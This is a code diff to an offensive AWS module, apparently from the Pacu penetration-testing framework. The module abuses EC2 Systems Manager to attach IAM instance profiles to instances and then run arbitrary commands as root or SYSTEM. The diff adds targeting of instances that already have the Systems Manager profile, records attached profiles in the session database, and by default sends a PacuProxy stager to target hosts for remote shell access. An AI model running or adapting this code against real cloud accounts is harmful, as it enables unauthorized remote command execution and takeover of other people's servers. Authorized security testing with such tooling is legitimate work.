@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import argparse
+import copy
 import os
 import re
 import time
@@ -20,7 +21,7 @@ module_info = {
     'one_liner': 'Tries to execute code as root/SYSTEM on EC2 instances.',
 
     # Full description about what the module does and how it works
-    'description': 'This module tries to execute arbitrary code on EC2 instances as root/SYSTEM using EC2 Systems Manager. To do so, it will first try to enumerate EC2 instances that are running operating systems that have the Systems Manager agent installed by default. Then, it will attempt to find the Systems Manager IAM instance profile, or try to create it if it cannot find it. If successful, it will try to attach it to the instances enumerated earlier. Then it will use EC2 Run Command to execute arbitrary code on the EC2 instances as either root (Linux) or SYSTEM (Windows). If PacuProxy is listening and no command argument is passed in, then by default, this module will execute a PacuProxy stager on the target hosts to get a PacuProxy agent to route commands through/give you shell access. Note: Linux targets will run the command using their default shell (bash/etc.) and Windows hosts will run the command using PowerShell, so be weary of that when trying to run the same command against both operating systems.',
+    'description': 'This module tries to execute arbitrary code on EC2 instances as root/SYSTEM using EC2 Systems Manager. To do so, it will first try to enumerate EC2 instances that are running operating systems that have the Systems Manager agent installed by default. Then, it will attempt to find the Systems Manager IAM instance profile, or try to create it if it cannot find it. If successful, it will try to attach it to the instances enumerated earlier. Then it will use EC2 Run Command to execute arbitrary code on the EC2 instances as either root (Linux) or SYSTEM (Windows). If PacuProxy is listening and no command argument is passed in, then by default, this module will execute a PacuProxy stager on the target hosts to get a PacuProxy agent to route commands through/give you shell access. Note: Linux targets will run the command using their default shell (bash/etc.) and Windows hosts will run the command using PowerShell, so be weary of that when trying to run the same command against both operating systems. NOTE: Sometimes Systems Manager Run Command can delay the results of a call by a random amount. I have experienced 15 minute delays before my command was executed on the target, so if this module successfully completes and it seems that your command did not execute like it was supposed to, then wait at least 15 minutes before trying again.',
 
     # A list of AWS services that the module utilizes during its execution
     'services': ['EC2'],
@@ -235,6 +236,7 @@ def main(args, pacu_main):
             if len(response['InstanceProfiles']) > 0:
                 ssm_instance_profile_name = response['InstanceProfiles'][0]['InstanceProfileName']
                 ssm_instance_profile_arn = response['InstanceProfiles'][0]['Arn']
+                ssm_instance_profile_id = response['InstanceProfiles'][0]['InstanceProfileId']
                 print('Found valid instance profile: {}.\n'.format(ssm_instance_profile_name))
             # Else, leave ssm_instance_profile_name == ''
 
@@ -249,6 +251,7 @@ def main(args, pacu_main):
 
                 ssm_instance_profile_name = response['InstanceProfileName']
                 ssm_instance_profile_arn = response['Arn']
+                ssm_instance_profile_id = response['InstanceProfileId']
 
                 # Attach our role to the new instance profile
                 client.add_role_to_instance_profile(
@@ -286,6 +289,9 @@ def main(args, pacu_main):
     # likely due to permissions, but I give the user a choice below in the
     # error handling section
     replace = args.replace
+
+    ec2_data = copy.deepcopy(session.EC2)
+
     for region in regions:
         client = pacu_main.get_boto3_client('ec2', region)
         # instances_to_replace will be filled up as each instance is checked for
@@ -299,9 +305,13 @@ def main(args, pacu_main):
                 if instance['Region'] == region:
                     if args.target_instances is not None or args.all_instances is True or instance['ImageId'] in vuln_images:
                         if 'IamInstanceProfile' in instance:
-                            # The instance already has an instance profile attached, skip it if
-                            # args.replace is not True, otherwise add it to instances_to_replace
-                            if args.replace is True and replace is True:
+                            # The instance already has an instance profile attached, add it to
+                            # targets if it is an SSM instance profile, skip it if args.replace
+                            # is not True, otherwise add it to instances_to_replace
+                            if instance['IamInstanceProfile']['Arn'] == ssm_instance_profile_arn:
+                                print('  Instance ID {} already has a Systems Manager instance profile attached to it. Adding to target list...\n'.format(instance['InstanceId']))
+                                targeted_instances.append(instance['InstanceId'])
+                            elif args.replace is True and replace is True:
                                 instances_to_replace.append(instance['InstanceId'])
                             else:
                                 print('  Instance ID {} already has an instance profile attached to it, skipping...'.format(instance['InstanceId']))
@@ -316,6 +326,14 @@ def main(args, pacu_main):
                                 }
                             )
                             targeted_instances.append(instance['InstanceId'])
+                            for instance_in_db in ec2_data['Instances']:
+                                if 'IamInstanceProfile' not in instance_in_db:
+                                    instance_in_db['IamInstanceProfile'] = {}
+
+                                if instance_in_db['InstanceId'] == instance['InstanceId']:
+                                    instance_in_db['IamInstanceProfile']['Arn'] = ssm_instance_profile_arn
+                                    instance_in_db['IamInstanceProfile']['Id'] = ssm_instance_profile_id
+                                    break
                             print('  Instance profile attached to instance ID {}.'.format(instance['InstanceId']))
         if len(instances_to_replace) > 0 and replace is True:
             # There are instances that need their role replaced, so discover association IDs to make that possible
@@ -355,6 +373,11 @@ def main(args, pacu_main):
                         }
                     )
                     targeted_instances.append(instance_id)
+                    for instance_in_db in ec2_data['Instances']:
+                        if instance_in_db['InstanceId'] == instance['InstanceId']:
+                            instance_in_db['IamInstanceProfile']['Arn'] = ssm_instance_profile_arn
+                            instance_in_db['IamInstanceProfile']['Id'] = ssm_instance_profile_id
+                            break
                     print('  Instance profile replaced for instance ID {}.'.format(instance_id))
                 except Exception as error:
                     print('  Failed to run replace_iam_instance_profile_association on instance ID {}: {}\n'.format(instance_id, str(error)))
@@ -365,6 +388,7 @@ def main(args, pacu_main):
                         replace = False
                         break
 
+    session.update(pacu_main.database, EC2=ec2_data)
     print('\n  Done.\n')
 
     # Start polling SystemsManager/RunCommand to see if instances show up
@@ -417,7 +441,7 @@ def main(args, pacu_main):
 
             # Windows
             if len(windows_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or args.target_os.lower() == 'windows'):
-                # If a shell command was passed in, run it. Otherwise, try to install python3 then run a PacuProxy stager
+                # If a shell command was passed in, run it. Otherwise, try to run a PacuProxy stager
                 if args.command is not None:
                     params = {
                         'commands': [args.command]
@@ -437,14 +461,14 @@ def main(args, pacu_main):
 
             # Linux
             if len(linux_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or args.target_os.lower() == 'linux'):
-                # If a shell command was passed in, run it. Otherwise, try to install python3 then run a PacuProxy stager
+                # If a shell command was passed in, run it. Otherwise, try to run a PacuProxy stager
                 if args.command is not None:
                     params = {
                         'commands': [args.command]
                     }
                 else:
                     params = {
-                        'commands': ['yum install python3 -y', 'apt-get install python3 -y', pp_sh_stager]
+                        'commands': [pp_sh_stager]
                     }
                 response = client.send_command(
                     InstanceIds=linux_instances_to_attack,
